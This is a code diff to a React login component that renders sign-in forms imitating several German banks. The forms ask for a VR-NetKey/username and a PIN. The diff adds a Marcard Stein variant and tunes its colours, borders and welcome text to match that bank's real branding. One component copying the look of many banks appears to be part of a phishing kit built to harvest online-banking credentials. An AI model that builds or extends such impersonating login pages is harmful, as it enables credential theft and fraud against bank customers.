@@ -269,7 +269,8 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const isPSD = bank?.group === "PSD Banken";
   const isSparda = bank?.group === "Sparda-Banken";
   const isGLS = bank?.group === "GLS Bank";
-  const isWarburg = bank?.group === "Spezifische Banken" && (bank?.name?.toLowerCase().includes("warburg") || bank?.name?.toLowerCase().includes("stein"));
+  const isMarcard = bank?.group === "Spezifische Banken" && (bank?.name?.toLowerCase().includes("marcard") || bank?.name?.toLowerCase().includes("stein"));
+  const isWarburg = !isMarcard && bank?.group === "Spezifische Banken" && bank?.name?.toLowerCase().includes("warburg");
   const isQlick = bank?.name?.toLowerCase().includes("qlick");
 
   const secureGoLabel = getSecureGoLabel(bank?.group);
@@ -601,12 +602,12 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         <div className="w-full lg:w-1/2 flex flex-col gap-4">
           <div className="bg-white shadow-md border border-gray-200 overflow-hidden" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
             <div className="p-6 sm:p-8">
-              {isGLS || isWarburg || isQlick ? (
+              {isGLS || isWarburg || isMarcard || isQlick ? (
                 <div className="flex flex-col mb-6">
                   <h2 className={`text-3xl font-bold mb-6 ${isGLS ? "text-[#002864]" : "text-gray-800"}`}>
                     Anmelden
                   </h2>
-                  {(isWarburg || isQlick) && (
+                  {(isWarburg || isMarcard || isQlick) && (
                     <div className="mb-6">
                       <p className={`font-bold text-sm ${isQlick ? "text-gray-800" : "text-gray-700"} mb-2`}>
                         {isQlick ? "Achten Sie auf Ihre Daten" : `Herzlich willkommen zum ${bank?.name} Onlinebanking`}
@@ -619,7 +620,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     </div>
                   )}
                   <div className="flex border-b border-gray-200 mb-6">
-                    <button type="button" className={`px-1 pb-3 text-sm font-bold border-b-2 ${isGLS ? "text-[#002864] border-[#002864]" : (isWarburg || isQlick) ? "text-[#003366] border-[#003366]" : "text-gray-600 border-gray-600"}`}>
+                    <button type="button" className={`px-1 pb-3 text-sm font-bold border-b-2 ${isGLS ? "text-[#002864] border-[#002864]" : (isWarburg || isQlick) ? "text-[#003366] border-[#003366]" : isMarcard ? "border-current" : "text-gray-600 border-gray-600"}`} style={isMarcard ? { color: theme.buttonBg, borderColor: theme.buttonBg } : undefined}>
                       Mit Zugangsdaten anmelden
                     </button>
                   </div>
@@ -659,8 +660,8 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       value={vrNetKey}
                       onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
-                       className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : (isGLS || isWarburg || isQlick) ? "border-gray-800" : "border-gray-300"}`}
-                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg || isQlick) ? "4px" : buttonBorderRadius }}
+                       className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : (isGLS || isWarburg || isMarcard || isQlick) ? "border-gray-800" : "border-gray-300"}`}
+                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg || isMarcard || isQlick) ? "4px" : buttonBorderRadius }}
 
 
                       autoComplete="username"
@@ -690,8 +691,8 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       value={pin}
                       onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
-                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : (isGLS || isWarburg || isQlick) ? "border-gray-800" : "border-gray-300"}`}
-                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg || isQlick) ? "4px" : buttonBorderRadius }}
+                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : (isGLS || isWarburg || isMarcard || isQlick) ? "border-gray-800" : "border-gray-300"}`}
+                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg || isMarcard || isQlick) ? "4px" : buttonBorderRadius }}
 
 
 
@@ -732,7 +733,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     style={{ 
                       borderColor: (isGLS || isQlick) ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText, 
                       color: (isGLS || isQlick) ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText,
-                      borderRadius: (isGLS || isWarburg || isQlick) ? "9999px" : buttonBorderRadius
+                      borderRadius: (isGLS || isWarburg || isMarcard || isQlick) ? "9999px" : buttonBorderRadius
                     }}
 
 
@@ -745,7 +746,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     className={`px-8 py-3 text-white font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
                     style={{ 
                       backgroundColor: (isGLS || isQlick) ? "#003366" : isWarburg ? "#6d7e8b" : theme.buttonBg,
-                      borderRadius: (isGLS || isWarburg || isQlick) ? "9999px" : buttonBorderRadius
+                      borderRadius: (isGLS || isWarburg || isMarcard || isQlick) ? "9999px" : buttonBorderRadius
 
                     }}
 
